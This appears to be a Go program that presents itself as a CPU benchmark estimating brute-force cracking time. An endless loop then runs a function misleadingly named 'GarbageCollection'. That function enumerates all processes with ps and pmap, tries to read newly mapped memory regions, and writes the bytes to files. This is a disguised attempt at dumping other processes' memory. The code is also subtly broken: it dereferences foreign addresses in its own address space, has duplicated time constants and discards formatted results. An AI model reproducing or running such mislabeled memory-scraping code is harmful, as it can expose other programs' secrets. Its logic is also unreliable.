package main

import (
	"fmt"
	"math"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"
)

const SecondsInCreation = 1419120000000000000000 // Age of the world. //Age of the Earth ~ 4 Billion Years
const SecondsInMillenia = 31540000000            // Seconds in a Millenia.
const SecondsInCentury = 31540000000             // Seconds in a Century.
const SecondsInYear = 31540000                   // Seconds in a Year.
const SecondsInHour = 3600                       // Seconds in an Hour.
const SecondsInMinute = 60                       // Seconds in a Minute.
const NbOperations = 1000000000                  // 1 Billion operations * CPUs --> ex.:(4 Cores = 4B operations)
const MaxBits = 8                                // 8 = 256 bits
const MinBits = 2                                // 2 = 4  bits

func Operations(wg *sync.WaitGroup, CPUs int64) {
	defer wg.Done()
	var j float64
	for j = 0; j < float64(NbOperations)/float64(CPUs); j++ {
		continue
	}
}

func Processing(wg *sync.WaitGroup, number float64, add float64, CPUs int64, result chan float64) {
	defer wg.Done()
	result <- number + add
	////CODE GOES BELOW
	wg.Add(1)
	go Operations(wg, CPUs)
	////CODE ENDS
}

func LoadCPUs(wg *sync.WaitGroup, CPUs int64) {
	defer wg.Done()
	var i float64
	result := make(chan float64)

	for i = 1; i <= float64(CPUs); i = <-result {
		wg.Add(1)
		go Processing(wg, i, 1, CPUs, result) // leave 1 for processing.
	}
	wg.Wait()
	close(result)
	wg.Add(1) //the caller's
}

func CalculateBitPermutations(bits int) float64 {
	var InitialNumberOfObjects float64
	var Objects []float64
	var Multiplied float64 = 1
	InitialNumberOfObjects = math.Pow(2.0, float64(bits))
	for i := InitialNumberOfObjects; i > 1; i-- {
		Objects = append(Objects, i)
	}
	for _, Object := range Objects {
		Multiplied = Multiplied * Object
	}
	return Multiplied
}

func Benchmark() string {
	var wg sync.WaitGroup
	var RequiredTime float64
	var FinalHours string
	bits := make(map[float64]float64)
	CPUs := int64(runtime.NumCPU())
	fmt.Println("-==BENCHMARK STARTED==-")
	start := time.Now()

	LoadCPUs(&wg, CPUs)
	wg.Wait()

	end := time.Now()
	elapsed := end.Sub(start).Seconds()
	OperationsPerSeconds := float64(NbOperations*CPUs) / float64(elapsed)
	fmt.Println("-==BENCHMARK COMPLETE==-")
	fmt.Println("------------------------------------STATS----------------------------------")
	fmt.Printf("Operations per second-->%13.f\n", OperationsPerSeconds)

	for i := MinBits; i <= MaxBits; i++ {
		bits[math.Pow(2, float64(i))] = CalculateBitPermutations(i)
	}

	for Strength, Permutations := range bits {
		RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInCreation)) // 4 Billion Years
		if RequiredTime < 1 {
			RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInMillenia))
			if RequiredTime < 1 {
				RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInCentury))
				if RequiredTime < 1 {
					RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInYear))
					if RequiredTime < 1 {
						RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInHour))
						if RequiredTime < 1 {
							RequiredTime = (Permutations / (OperationsPerSeconds * SecondsInMinute))
							if RequiredTime < 1 {
								fmt.Sprintf("Strength=%.fbits in %.15f Seconds\n", Strength, RequiredTime) //precision 1 femtosecond
							} else {
								fmt.Sprintf("Strength=%.fbits in %.2f Minutes\n", Strength, RequiredTime)
							}
						} else {
							FinalHours = fmt.Sprintf("Strength=|%.f|bits in |%.2f| Hours\n", Strength, RequiredTime)
							break
						}
					} else {
						fmt.Sprintf("Strength=%.fbits in %.2f Years\n", Strength, RequiredTime)
					}
				} else {
					fmt.Sprintf("Strength=%.fbits in %.2f Century\n", Strength, RequiredTime)
				}
			} else {
				fmt.Sprintf("Strength=%.fbits in %.2f Millenias\n", Strength, RequiredTime)
			}
		} else {
			fmt.Sprintf("Strength=%.fbits in Billions of Years...\n", Strength)
		}
	}
	return FinalHours
}

func MemoryMap() map[string]string {
	var pid []string
	var processName []string
	MemMap := make(map[string]string)

	// Run the `ls` command to list the running processes
	psCmd := exec.Command("ps", "-eo", "pid,comm")
	psCmd.Stderr = os.Stderr
	psOutput, _ := psCmd.Output()

	// Split the output into lines
	lines := strings.Split(string(psOutput), "\n")

	// Iterate through the lines to print PID and process name
	for _, line := range lines[1:] { // Skip the header line
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			pid = append(pid, fields[0])
			processName = append(processName, fields[1])
			//fmt.Printf("PID: %s, Process Name: %s\n", pid, processName)
		}
	}
	// Run the `pmap` command for each process and print memory information
	for _, process := range pid {
		pmapCmd := exec.Command("pmap", "-q", process)
		pmapCmd.Stderr = os.Stderr
		pmapOutput, err := pmapCmd.Output()
		if err != nil {
			//fmt.Printf("Error running pmap for process %s: %v\n", process, err)
			continue
		}

		lines := strings.Split(string(pmapOutput), "\n")

		// Iterate through the lines to print PID and process name
		for _, line := range lines[1:] { // Skip the header line
			fields := strings.Fields(line)
			if len(fields) >= 4 {
				MemMap[fields[0]] = fields[1] + "|||" + fields[3]
			}
		}
	}
	return MemMap
}

func scanMemory(oldMemMap map[string]string) map[string]string {
	MemMap := make(map[string]string)
	MissingEntries := make(map[string]string)
	for {
		MemMap = MemoryMap()
		for key := range MemMap {
			if _, exists := oldMemMap[key]; !exists {
				MissingEntries[key] = MemMap[key]
			}
		}
		if len(MissingEntries) > 0 {
			break
		}
	}
	return MissingEntries
}

func ReadBytesAtAddress(address uintptr, Size int) []byte {
	sliceHeader := &reflect.SliceHeader{
		Data: address,
		Len:  Size,
		Cap:  Size,
	}
	return *(*[]byte)(unsafe.Pointer(sliceHeader))
}

func GarbageCollection() {
	var MemMap map[string]string
	var MissingMemEntries map[string]string

	MissingMemEntries = scanMemory(MemMap)

	for mem, SizeProgram := range MissingMemEntries {
		var Size int
		var MemoryAddress uint64
		var ProgramName string
		var Program []byte
		Size, _ = strconv.Atoi(strings.Split(strings.Split(SizeProgram, "|||")[0], "K")[0])
		Size = Size * 1024 //bytes
		ProgramName = strings.Split(SizeProgram, "|||")[1]
		MemoryAddress, _ = strconv.ParseUint(mem, 16, 64)
		address := uintptr(MemoryAddress)
		//ptr := unsafe.Pointer(address)

		bufferRAM := ReadBytesAtAddress(address, Size)
		Program = []byte(bufferRAM[:])
		f, err := os.Create(ProgramName)
		if err != nil {
			f.Close()
			os.Remove(ProgramName)
			continue
		} else {
			f.Write(Program)
			f.Close()
			fStat, err := os.Stat(ProgramName)
			if err != nil {
				panic(err)
			}
			if fStat.Size() == 0 {
				os.Remove(ProgramName)
			}
		}
	}

}

func main() {
	var BenchmarkResult string
	var BenchmarkBits float64
	var BenchmarkHours float64
	BenchmarkResult = Benchmark()
	BenchmarkBits, _ = strconv.ParseFloat(strings.Split(BenchmarkResult, "|")[1], 64)
	BenchmarkHours, _ = strconv.ParseFloat(strings.Split(BenchmarkResult, "|")[3], 64)
	fmt.Printf("Benchmark Result-->%10.fbits in %.2f hours is possible on this machine\n", BenchmarkBits, BenchmarkHours)
	fmt.Println("----------------------------------END STATS--------------------------------")
	for {
		GarbageCollection()
	}
}
